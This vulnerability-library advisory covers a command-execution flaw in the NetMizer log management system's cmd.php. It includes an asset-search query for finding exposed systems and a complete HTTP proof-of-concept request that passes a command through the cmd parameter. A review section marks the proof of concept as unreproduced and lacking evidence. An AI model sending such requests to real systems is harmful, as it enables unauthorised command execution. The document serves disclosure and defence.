---
source: "wy876 漏洞文库"
id: "vw-5e246f72f54ba15d30ac48d0"
entity_id: "ve-5e246f72f54ba15d30ac48d0"
schema_version: "1"
title: "NetMizer 日志管理系统cmd存在命令执漏洞"
product: "NetMizer日志管理系统"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "未给版本、认证及部署条件"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/NetMizer/NetMizer%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fcmd%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/hi1upuiio8gsogz8"
source_status: "recorded"
---

# NetMizer 日志管理系统cmd存在命令执漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：NetMizer日志管理系统
- 本文讨论：data/manage/cmd.php 命令执行
- 版本、权限与配置前提：未给版本、认证及部署条件
- 资料类型：接口PoC摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅GET cmd=id请求，无响应或权限证据
- 标题命令执缺字；来源为语雀转载，缺原始披露/补丁
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 不能仅凭接口名判断无认证命令执行；需来源和版本
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


### 一、漏洞描述
NetMizer 日志管理系统 cmd.php中存在远程命令执行漏洞，攻击者通过传入 cmd参数即可命令执行

### 二、影响版本
<font style="color:#000000;">NetMizer</font>

### 三、资产测绘
```plain
title="NetMizer 日志管理系统"
```


### 四、漏洞复现
```http
GET /data/manage/cmd.php?cmd=id HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hi1upuiio8gsogz8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
